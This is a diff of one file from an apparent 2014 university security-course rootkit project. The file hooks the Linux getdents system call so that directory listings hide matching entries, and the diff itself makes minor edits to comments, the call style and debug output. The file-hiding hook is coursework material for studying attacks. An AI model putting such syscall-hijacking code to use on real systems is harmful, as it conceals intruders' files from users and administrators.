@@ -1,18 +1,20 @@
 /**********************************************************
-	Last Updated: Nov 1, 2014
+	Last Updated: Nov 16, 2014
 	CSE509 System Security 2014 Fall @CS SBU
 	Written By: 
 		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
 		Yaohui Chen (yaohchen@cs.stonybrook.edu)
 
 	Description: 
-		Functions related to hijack a “ls” system call
+		Functions related to hijack a 'getdents' system call
 ***********************************************************/
 
 #include "../headers/all.h"
 #include "../headers/HJ_ls.h"
 
+
 EXPORT_SYMBOL(my_getdents);
+
 
 extern asmlinkage int
 (*original_getdents)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
@@ -26,10 +28,7 @@ my_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 	struct dirent *buf;
 	struct dirent *curr;
 	struct dirent *prev = NULL;
-	
-	// TO CHEN -> USE func() INSTEAD OF *func(); THIS SEEMS TO MAKE SYSTEM DOWN!!
-	//ret = (*original_getdents)(fd, dirp, count);
-	ret = original_getdents(fd, dirp, count);
+	ret = (*original_getdents)(fd, dirp, count);
 	/*char *(hide_prefix_dym[0]);*/
 	/*setHideStr(hide_prefix_dym);*/
 	
@@ -72,7 +71,7 @@ notfound:		prev = curr;
 				ptr += curr->d_reclen;
 			}	
 			copy_to_user(dirp, buf, ret);
-			printk("%d \n",ret);
+			//printk("%d \n",ret);
 			kfree(buf);
 	}
 	return ret;
